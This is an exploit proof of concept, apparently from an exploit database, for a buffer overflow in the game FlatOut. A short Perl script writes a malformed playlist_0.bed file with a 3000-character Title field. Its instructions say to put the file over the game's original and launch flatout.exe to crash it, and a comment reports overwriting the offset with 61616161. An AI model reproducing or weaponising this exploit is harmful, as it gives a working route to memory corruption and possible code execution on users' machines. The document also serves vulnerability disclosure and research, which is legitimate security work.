#Exploit Title: FlatOut Malformed .bed file Buffer Overflow
# Date: 11-29-11
# Author: Silent Dream
# Software Link: http://www.gog.com/en/gamecard/flatout
# Version: Latest
# Tested on: Windows 7

#Tested on GOG.com copy of FlatOut.  Exception offset = 61616161
#Multiple .bed files are vulnerable to buffer overflows...too many to even begin to list..

my $file = "playlist_0.bed";
my $head = "Title	=	\"";
my $junk = "a" x 3000 . "\"\r";
my $tail = "Loop	= {" . "\r}";
open($File, ">$file");
print $File $head.$junk.$tail;
close($FILE);
print "Overwrite the original playlist_0.bed file in %program files%\\GOG.com\\FlatOut\\data\\music and launch flatout.exe...wait for the crash\r\n";